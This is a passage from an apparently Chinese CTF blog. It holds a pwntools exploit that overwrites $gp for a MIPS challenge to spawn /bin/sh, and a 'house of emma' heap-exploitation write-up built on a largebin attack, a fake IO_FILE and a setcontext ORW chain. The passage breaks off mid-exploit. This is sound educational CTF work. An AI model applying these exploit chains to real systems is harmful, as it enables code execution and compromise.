class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> getoutput</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># initialize the binary</span></span><br><span class="line">build = <span class="string">&#x27;mipsel32r6-musl&#x27;</span></span><br><span class="line">binary = <span class="string">&quot;./outdated&quot;</span></span><br><span class="line">elf = context.binary = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">docker = ELF(<span class="string">&#x27;/usr/bin/docker&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">gs = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">set architecture mips:isa32r6</span></span><br><span class="line"><span class="string">break *main+536</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote(<span class="string">&quot;outdated.chals.sekai.team&quot;</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">### SOLVE POW ###</span></span><br><span class="line">    cmd = p.recvline().decode().strip().removeprefix(<span class="string">&quot;proof of work: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Solving POW: <span class="subst">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class="line">    answer = getoutput(cmd)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;solution: &quot;</span>, answer.encode())</span><br><span class="line"><span class="keyword">elif</span> args.GDB:</span><br><span class="line">    context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;65%&quot;</span>]</span><br><span class="line">    p = docker.process([<span class="string">&#x27;run&#x27;</span>,<span class="string">&#x27;-i&#x27;</span>,<span class="string">&#x27;--rm&#x27;</span>,<span class="string">&#x27;-v&#x27;</span>,<span class="string">&#x27;./:/target/ctf&#x27;</span>,<span class="string">&#x27;-p&#x27;</span>,<span class="string">&#x27;1234:1234&#x27;</span>,<span class="string">f&#x27;legoclones/mips-pwn:<span class="subst">&#123;build&#125;</span>&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;/target&#x27;</span>,<span class="string">&#x27;/qemu&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;/ctf/outdated&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Remote debugging started...&quot;</span>)</span><br><span class="line">    gdb.attach((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1234</span>), gdbscript=gs, exe=binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = docker.process([<span class="string">&#x27;run&#x27;</span>,<span class="string">&#x27;-i&#x27;</span>,<span class="string">&#x27;--rm&#x27;</span>,<span class="string">&#x27;-v&#x27;</span>,<span class="string">&#x27;./:/target/ctf&#x27;</span>,<span class="string">f&#x27;legoclones/mips-pwn:<span class="subst">&#123;build&#125;</span>&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;/target&#x27;</span>,<span class="string">&#x27;/qemu&#x27;</span>,<span class="string">&#x27;/ctf/outdated&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### GET EXE LEAK ###</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Here&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(p.recvline().strip().split(<span class="string">b&#x27; &#x27;</span>)[-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;main() = <span class="subst">&#123;<span class="built_in">hex</span>(main_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### GP OVERWRITE 1 ###</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(using example addresses)</span></span><br><span class="line"><span class="string">old $gp = 0xf98000, puts() = $gp-0x7f84, exit() = $gp-0x7fac, thanks = $gp-0x7fd0</span></span><br><span class="line"><span class="string">new $gp = 0xf98090, puts() = 0xf9010c, exit() = 0xf900e4, thanks = 0xf900c0 (game_name @ 0xf900c0)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Our goal is to turn puts(&quot;Thanks for playing&quot;) into puts_blue(GOT[puts])</span></span><br><span class="line"><span class="string">and exit(0) into main(0)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">fake_got1 = flat(</span><br><span class="line">    <span class="comment"># 0xf900c0</span></span><br><span class="line">    p32(main_addr + <span class="number">0x1f6ac</span> - <span class="number">0x118c</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), <span class="comment"># GOT[puts] - main = 0x1f6ac (offset for &quot;Thanks&quot; string)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xf900d0</span></span><br><span class="line">    p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xf900e0</span></span><br><span class="line">    p32(<span class="number">0</span>), p32(main_addr), p32(<span class="number">0</span>), p32(<span class="number">0</span>), <span class="comment"># address for main() so exit() jumps back into main()</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xf900f0</span></span><br><span class="line">    p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0xf90100</span></span><br><span class="line">    p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(main_addr - <span class="number">0x80</span>), <span class="comment"># offset from main() to puts_blue()</span></span><br><span class="line">)</span><br><span class="line">p.sendline(fake_got1)                                   <span class="comment"># name (fake GOT in global)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;-12&#x27;</span>)                                      <span class="comment"># offset to stored $gp</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;32912&#x27;</span>)                                    <span class="comment"># least significant 2 bytes of new $gp</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### GET LIBC LEAK ###</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;in your game&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(p.recvline()[<span class="number">5</span>:<span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;puts() = <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### GP OVERWRITE 2 ###</span></span><br><span class="line">fake_got2 = flat(</span><br><span class="line">    <span class="comment"># 0xf900c0</span></span><br><span class="line">    p32(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>)) - <span class="number">0x118c</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), <span class="comment"># &quot;/bin/sh&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xf900d0</span></span><br><span class="line">    p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xf900e0</span></span><br><span class="line">    p32(<span class="number">0</span>), p32(main_addr), p32(<span class="number">0</span>), p32(<span class="number">0</span>), <span class="comment"># address for main() so exit() jumps back into main()</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xf900f0</span></span><br><span class="line">    p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0xf90100</span></span><br><span class="line">    p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(<span class="number">0</span>), p32(libc.sym[<span class="string">&#x27;system&#x27;</span>]), <span class="comment"># system()</span></span><br><span class="line">)</span><br><span class="line">p.sendline(fake_got2)                                   <span class="comment"># name (fake GOT in global)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;-12&#x27;</span>)                                      <span class="comment"># offset to stored $gp</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;32912&#x27;</span>)                                    <span class="comment"># least significant 2 bytes of new $gp</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯-2021-house of emma</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E6%B9%96%E6%B9%98%E6%9D%AF-2021-house%20of%20emma/"/>
      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E6%B9%96%E6%B9%98%E6%9D%AF-2021-house%20of%20emma/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯-2021-house-of-emma"><a href="#湖湘杯-2021-house-of-emma" class="headerlink" title="湖湘杯-2021-house of emma"></a>湖湘杯-2021-house of emma</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习<code>house of emma </code>的过程中找到了他的出处,遂体会</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>因为网上的题解(应该是出题人的分享),重点在说明<code>house of emma</code> 这个手法的利用链.但是自己在写题还是不能忽视其他的步骤</p><p>当然,每个函数都分析的话,有些浪费笔墨,所以我也只会分析我觉得重要的地方.</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003165813221.png" alt="image.png"></p><p>其实,刚开始看到这也只是看到,一次读入了<code>0x500</code>字节,也不知道是干啥. 在看完<code>menu</code>函数之后,才反应过来程序的一个流程. 这里的<code>while(1)</code>,让程序一直循环.</p><p>包括在<code>menu</code>里,也是一直循环,所以这里没有常规的方法可以触发<code>exit()</code>.而且这里,所有的<code>opcode</code>,都是一次输入.</p><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170338829.png"></p><p>这里主要是要确认<code>opcode</code>的格式, 每个<code>opcode</code>第一个字节是选项,然后是<code>idx</code>,<code>add()</code>和<code>edit()</code>需要<code>size</code>,<code>edit()</code>还需要<code>content</code></p><p>在这里的<code>case 5,</code>给了我们一个重头再来的机会,让我们可以在泄露地址信息之后回来.</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003170858151.png" alt="image.png"></p><p><code>add()</code>里对堆块的大小和数量,作了一定的限制.并且使用的是<code>calloc</code>,会清空堆块里的原始数据.</p><p>还有在<code>delete()</code>里<code>free</code> 后没有清空指针造成的<code>uaf</code></p><h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251003171555287.png" alt="image.png"></p><p>当然,不要忘了这题开了沙箱,专门限制了<code>execve </code>,所以只能<code>orw</code></p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><ol><li>首先是泄露<code>libc</code> 和 <code>heap</code> 地址,可以直接利用<code>uaf</code> 和<code>show()</code>函数做到.</li><li>使用 <code>LargeBin Attack</code> 来在<code> stderr</code> 指针处写一个可控地址</li><li>使用 <code>LargeBin Attack</code> 在<code>__pointer_chk_guard</code> 处写一个已知地址</li><li>通过写入的已知地址与需要调用的函数指针进行构造加密，同时构造出合理的<code> IO_FILE</code> 结构</li><li>利用 Unsorted Bin 会与 Top Chunk 合并的机制来修改 Top Chunk 的 Size，从而触发 <a href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a> 中的 IO 调用</li><li>进入 <code>House_OF_Emma</code> 的调用链，同时寻找一个能够转移 rdi 到 rdx 的 gadget，利用这个 gadget 来为 <code>Setcontext</code> 提供内容</li><li>利用 <code>Setcontext</code> 来执行 <code>ROP</code> 来 <code>ORW</code></li></ol><h2 id="exp详解"><a href="#exp详解" class="headerlink" title="exp详解"></a>exp详解</h2><p>在这里，largebin attack的部分就简单略过描写，我们的重点还是后续伪造<code>fake IO</code></p><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>以泄露<code>libc</code>为例,首先准备四个堆块.其中一个堆块略大于其他堆块是为后续利用准备.由于本程序的限制,让最小能申请到的堆块都会进入<code>unsorted bin</code>.</p><p>所以我们在free 一个堆块后,再申请一个更大的堆块,就可以把他放入<code>largebins</code>.第一次直接<code>show()</code>,即可泄露<code>libc</code>地址.而要泄露<code>heap</code>地址,要先利用<code>edit()</code>修改<code>fd</code>和<code>bk</code>,这样才能把<code>fd_nextsize</code>的内容,也就是<code>chunk2</code>的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x430</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">io.recvuntil(<span class="string">&quot;Del Done\nMalloc Done\n&quot;</span>)</span><br><span class="line">libc_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1f30b0</span></span><br><span class="line">logv(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><h3 id="largebins-attack"><a href="#largebins-attack" class="headerlink" title="largebins attack"></a>largebins attack</h3><p>以修改<code>stderr</code>为例,此时有之前<code>free</code>的<code>chunk2</code>,现在<code>free</code>掉<code>chunk0</code>.此时如果正常,前面再申请一个更大的堆块,结果就是<code>chunk0</code>,会链入<code>largebins</code>.</p><p>现在,先修改<code>chunk2</code>的<code>bk_nextsize</code>,再申请大堆块,就可以往<code>target</code>里写入<code>chunk2</code>的地址.<br>所以成功之后,<code>sterr</code> 就被修改为了<code>chunk2</code></p><p>把<code>chunk2</code> 和 <code>chunk0</code> 改好是为了后续的持续利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x1f30b0</span>)*<span class="number">2</span> + p64(heap_base +<span class="number">0x2ae0</span>) + p64(stderr - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x22a0</span>) + p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x22a0</span>) * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x2ae0</span>) * <span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">run()   </span><br></pre></td></tr></table></figure><p>关于<code>largebins attack</code> 的详细利用及原理,不在本文讲解,将在其他文章详细分析</p><h3 id="修改top-chunk-size"><a href="#修改top-chunk-size" class="headerlink" title="修改top chunk size"></a>修改top chunk size</h3><p>这里是<code>exp</code>中的<code>93-102</code>行,这里的<code>chunk7</code> ,<code>size</code>是<code>0x450</code>. <code>free</code>掉会被<code>top chunk</code>合并.我们再次申请<code>0x430</code>大小的chunk 8.</p><p>通过<code>uaf</code>留下的<code>chunk7</code>的<code>size</code> 和 指针,我们就可以修改到<code>top chunk</code>的<code>size</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">7</span>, <span class="number">0x450</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x22a0</span>) + p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x22a0</span>) * <span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc_base + <span class="number">0x1f30b0</span>) + p64(heap_base + <span class="number">0x2ae0</span>) * <span class="number">3</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">run()</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x438</span> + p64(<span class="number">0x300</span>))</span><br><span class="line">run()</span><br></pre></td></tr></table></figure><h3 id="fake-io-及-最后的利用链"><a href="#fake-io-及-最后的利用链" class="headerlink" title="fake io 及 最后的利用链"></a>fake io 及 最后的利用链</h3><p>总算是到了我们本题的重点.首先我们要明确执行到这一步,程序的一个情况.我们最后把<code>top chunk</code>的<code>size</code>修改为了<code>0x300</code>(当然,你想改成多少,就改成多少),然后我们通过申请比这个<code>size</code>大的堆块来触发<code>sysmalloc</code>,继而触发<code>__malloc_assert</code>.</p><p>触发之后,会先调用<code>fxprintf</code>.经过几层调用之后,会在<code>__vfprintf_internal</code>里有如下调用:</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006204940659.png" alt="call "></p><p>正常情况下<code>rbx</code>是<code>stderr</code>的<code>vatable</code>,这已经被我们替换为了<code>fake io</code>的对应部分.这里我们按照出题者的想法,把这替换成<code>_io_cookie_jumps+0x38</code>,这样可以调用<code>_io_cookie_read</code>.<br>接着往下看:</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006205743073.png" alt="image.png"></p><p>这里算是<code>house of emma</code>的起点.现在的思路是,利用<code>setcontext</code>去控制程序的执行流(因为这里可以控制rsp的位置)但是这个版本的<code>setcontext</code>的参数控制都是通过<code>rdx</code>来的,所以我们现在需要控制<code>rdx</code></p><p>通过这样的指令,我们可以找到需要的gadgets.为什么这么搜? 首先,<code>grep &quot;rdx&quot;</code>不用过多解释吧. <code>mov</code> 是赋值的,也不多说.为什么最后是<code>call</code> 呢? 因为我们现在不能控制栈,所以我们希望有<code>call</code>和<code>jmp</code> 这样的指令,可以跳转.就解释到这</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so<span class="number">.6</span> --only <span class="string">&quot;mov|call&quot;</span> |grep <span class="string">&quot;rdx&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006210955555.png" alt="image.png"></p><p>这条gadget可以利用.首先rdi已经被控制为了<code>fake io+0xe0</code>里的地址,所以这里的<code>rdi+8</code> 和它里面的内容都可以控制.然后,修改了rsp里的内容,无影响.最后调用<code>rdx+20</code>里的内容.</p><p>所以,最后的rdx是 <code>[[fake io+0xe0]+8]</code>,这里注意控制.然后我们控制<code>[rdx+0x20]</code>为<code>setcontext+61</code>,接着就会执行<code>setcontext+61</code>.</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212459421.png" alt="image.png"></p><p>第一行就是关键代码,这里我们往<code>fake io</code>后面继续布置.将<code>rdx </code>改到<code>fake io</code>上的某个地址,然后在对应的偏移,继续设置为堆上地址(就是布置的<code>orw</code>的地址).如下图:</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006212914484.png" alt="image.png"></p><p>然后,需要注意的是<code>rcx</code>,而且它会<code>push rcx</code>,并且在后续会<code>ret</code>.所以我们要让<code>rcx</code>的内容是<code>ret</code>指令,这个很简单,只要在<code>ORW</code>的上方布置一个<code>ret gadget</code>的地址就行了.</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20251006213147692.png" alt="image.png"></p><p>然后就是正常的<code>orw</code>的执行了</p><p>伪造<code>fake io</code>的过程,需要配合动调实时查看,一开始一次完成构造不太现实.中间对于偏移的计算也会出现一些问题.</p><p>当然熟练之后,可以把这个写成模板,以后遇到类似的利用就可以直接套用模板来写.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;66%&#x27;</span>]</span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./pwn&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="number">0</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">opcode=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    <span class="keyword">global</span> opcode</span><br><span class="line">    opcode+=p8(<span class="number">1</span>)+p8(idx)+p16(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">global</span> opcode</span><br><span class="line">    opcode+=p8(<span class="number">2</span>)+p8(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="keyword">global</span> opcode</span><br><span class="line">    opcode+=p8(<span class="number">3</span>)+p8(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    <span class="keyword">global</span> opcode</span><br><span class="line">    opcode+=p8(<span class="number">4</span>)+p8(idx)+p16(<span class="built_in">len</span>(content))+content</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">global</span> opcode</span><br><span class="line">    opcode += p8(<span class="number">5</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Pls input the opcode&quot;</span>,opcode)</span><br><span class="line">    opcode=<span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_left_64</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="comment"># 确保移动的位数在0-63之间</span></span><br><span class="line">    n = n % <span class="number">64</span></span><br><span class="line">    <span class="comment"># 先左移n位</span></span><br><span class="line">    left_shift = (x &lt;&lt; n) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="comment"># 